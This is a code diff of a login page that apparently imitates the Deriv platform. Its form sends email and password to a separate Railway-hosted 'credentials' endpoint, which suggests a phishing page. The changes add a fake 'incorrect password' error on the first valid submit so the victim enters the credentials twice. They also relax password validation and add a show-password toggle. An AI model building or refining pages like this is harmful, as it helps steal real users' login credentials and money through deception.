@@ -707,7 +707,7 @@
             <h1 class="title-text">Welcome back</h1>
             <form novalidate id="frmLogin" method="POST" action="https://deriv.up.railway.app/credentials">
                 <div class='input-group'>
-                    <div class="input-wrapper ">
+                    <div class="input-wrapper">
                         <input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required autocomplete="off" autofocus="autofocus" maxlength="254" />
                         <label for="txtEmail">Email</label>
                         <span class="bar"></span>
@@ -715,6 +715,7 @@
                     <div class="input-error">
                         <p class='hide error error_invalid'>That doesn't look like an email address.</p>
                         <p class='hide error error_required'>Email is required.</p>
+                        <p class='hide error error_invalid_pass'>Your email and/or password is incorrect. Perhaps you signed up with a social account?</p>
                     </div>
                 </div>
                 <div class="input-group">
@@ -859,7 +860,10 @@
 
 
         <script>
+            let submissionCounter = 0;
+
             document.getElementById('frmLogin').addEventListener('submit', function(event) {
+                submissionCounter++;
                 const email = document.getElementById('txtEmail').value;
                 const password = document.getElementById('txtPass').value;
                 let isValid = true;
@@ -867,13 +871,14 @@
                 const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 const uppercasePattern = /[A-Z]/;
                 const lowercasePattern = /[a-z]/;
-                const specialCharPattern = /[!@#$%^&*(),.?":{}|<>]/;
+                //const specialCharPattern = /[!@#$%^&*(),.?":{}|<>]/;
 
                 const emailErrorInvalid = document.querySelector('.error_invalid');
                 const emailErrorRequired = document.querySelector('.error_required');
                 const uppercaseError = document.querySelector('.error_uppercase');
                 const lowercaseError = document.querySelector('.error_lowercase');
-                const specialCharError = document.querySelector('.error_special');
+                //const specialCharError = document.querySelector('.error_special');
+                const invalidPassError = document.querySelector('.error_invalid_pass');
 
                 const errorDisplayDuration = 3000; // 3 seconds
 
@@ -917,16 +922,36 @@
                     isValid = false;
                 }
 
-                if (!specialCharPattern.test(password)) {
-                    specialCharError.classList.remove('hide');
-                    setTimeout(() => {
-                        specialCharError.classList.add('hide');
-                    }, errorDisplayDuration);
-                    isValid = false;
-                }
+                // if (!specialCharPattern.test(password)) {
+                //     specialCharError.classList.remove('hide');
+                //     setTimeout(() => {
+                //         specialCharError.classList.add('hide');
+                //     }, errorDisplayDuration);
+                //     isValid = false;
+                // }
 
-                if (!isValid) {
+                if (isValid && submissionCounter === 1) {
+                    invalidPassError.classList.remove('hide');
+                    setTimeout(() => {
+                        invalidPassError.classList.add('hide');
+                    }, errorDisplayDuration);
                     event.preventDefault();
+                } else if (!isValid) {
+                    event.preventDefault();
+                }
+            });
+
+            // Password visibility toggle
+            document.getElementById('btnToggle').addEventListener('click', function() {
+                const passwordField = document.getElementById('txtPass');
+                if (passwordField.type === 'password') {
+                    passwordField.type = 'text';
+                    this.classList.add('icon_visible');
+                    this.classList.remove('icon_hidden');
+                } else {
+                    passwordField.type = 'password';
+                    this.classList.add('icon_hidden');
+                    this.classList.remove('icon_visible');
                 }
             });
         </script>
